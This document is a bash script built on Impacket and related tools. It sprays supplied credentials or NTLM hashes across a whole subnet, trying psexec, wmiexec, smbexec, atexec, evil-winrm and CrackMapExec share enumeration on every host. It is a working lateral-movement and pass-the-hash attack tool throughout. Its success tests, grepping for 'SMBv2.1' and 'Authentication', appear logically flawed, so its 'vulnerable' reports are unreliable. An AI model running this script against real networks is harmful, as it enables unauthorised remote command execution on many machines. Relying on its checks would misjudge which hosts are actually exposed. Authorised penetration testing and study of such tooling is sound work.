#!/bin/bash

# Default values
USER=""
PASS=""
HASH=""
DOMAIN="WORKGROUP"
SUBNET=""
SINGLE_IP=""

# Full paths to Impacket scripts on Kali Linux
PSEXEC="/usr/share/doc/python3-impacket/examples/psexec.py"
WMIEXEC="/usr/share/doc/python3-impacket/examples/wmiexec.py"
SMBEXEC="/usr/share/doc/python3-impacket/examples/smbexec.py"
ATEXEC="/usr/share/doc/python3-impacket/examples/atexec.py"

# Function to handle Ctrl+C and exit the script
function handle_exit() {
    echo "Exiting script."
    exit 0
}

# Trap SIGINT signal (Ctrl+C)
trap handle_exit SIGINT

# Function to display usage
function usage() {
    echo "Usage: $0 -u username -p password [-H hash] -d domain -s subnet [-i single_ip]"
    echo ""
    echo "Options:"
    echo "  -u  Username for authentication"
    echo "  -p  Password for authentication"
    echo "  -H  Hash for authentication (alternative to password)"
    echo "  -d  Domain"
    echo "  -s  Subnet (e.g., 192.168.1)"
    echo "  -i  Single IP address"
    echo "  -h  Show this help message"
    exit 1
}

# Parse command-line arguments
while getopts "u:p:H:d:s:i:h" opt; do
    case ${opt} in
        u )
            USER=$OPTARG
            ;;
        p )
            PASS=$OPTARG
            ;;
        H )
            HASH=$OPTARG
            ;;
        d )
            DOMAIN=$OPTARG
            ;;
        s )
            SUBNET=$OPTARG
            ;;
        i )
            SINGLE_IP=$OPTARG
            ;;
        h )
            usage
            ;;
        \? )
            usage
            ;;
    esac
done

# Check if required arguments are provided
if [ -z "$USER" ] || { [ -z "$PASS" ] && [ -z "$HASH" ]; } || [ -z "$DOMAIN" ] || { [ -z "$SUBNET" ] && [ -z "$SINGLE_IP" ]; }; then
    usage
fi

# Function to test a single IP address
function test_ip() {
    local ip=$1
    echo "Checking $ip with CrackMapExec"
    # Check if shares are accessible
    if [ -n "$HASH" ]; then
        crackmapexec smb $ip -u $USER -H $HASH --shares --no-bruteforce | grep -q "SMBv2.1" && echo "$ip is vulnerable to SMB shares enumeration"
    else
        crackmapexec smb $ip -u $USER -p $PASS --shares --no-bruteforce | grep -q "SMBv2.1" && echo "$ip is vulnerable to SMB shares enumeration"
    fi

    echo "Checking $ip with psexec.py"
    # Attempt to connect with psexec.py and close immediately if successful
    if [ -n "$HASH" ]; then
        timeout 5s python3 $PSEXEC $DOMAIN/$USER@$ip -hashes $HASH 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to psexec"
    else
        timeout 5s python3 $PSEXEC $DOMAIN/$USER:$PASS@$ip 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to psexec"
    fi

    echo "Checking $ip with wmiexec.py"
    # Attempt to connect with wmiexec.py and close immediately if successful
    if [ -n "$HASH" ]; then
        timeout 5s python3 $WMIEXEC $DOMAIN/$USER@$ip -hashes $HASH 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to wmiexec"
    else
        timeout 5s python3 $WMIEXEC $DOMAIN/$USER:$PASS@$ip 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to wmiexec"
    fi

    echo "Checking $ip with smbexec.py"
    # Attempt to connect with smbexec.py and close immediately if successful
    if [ -n "$HASH" ]; then
        timeout 5s python3 $SMBEXEC $DOMAIN/$USER@$ip -hashes $HASH 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to smbexec"
    else
        timeout 5s python3 $SMBEXEC $DOMAIN/$USER:$PASS@$ip 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to smbexec"
    fi

    echo "Checking $ip with atexec.py"
    # Attempt to connect with atexec.py and close immediately if successful
    if [ -n "$HASH" ]; then
        timeout 5s python3 $ATEXEC $DOMAIN/$USER@$ip -hashes $HASH 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to atexec"
    else
        timeout 5s python3 $ATEXEC $DOMAIN/$USER:$PASS@$ip 2>&1 | grep -q "Authentication" && echo "$ip is vulnerable to atexec"
    fi

    echo "Checking $ip with evil-winrm"
    # Attempt to connect with evil-winrm and close immediately if successful
    if [ -n "$HASH" ]; then
        timeout 5s evil-winrm -i $ip -u $USER -H $HASH -s | grep -q "WinRM" && echo "$ip is vulnerable to evil-winrm"
    else
        timeout 5s evil-winrm -i $ip -u $USER -p $PASS -s | grep -q "WinRM" && echo "$ip is vulnerable to evil-winrm"
    fi
}

# Test a single IP if provided
if [ -n "$SINGLE_IP" ]; then
    test_ip $SINGLE_IP
else
    # Test the entire subnet
    for ip in $(seq 1 254); do
        test_ip "$SUBNET.$ip"
    done
fi
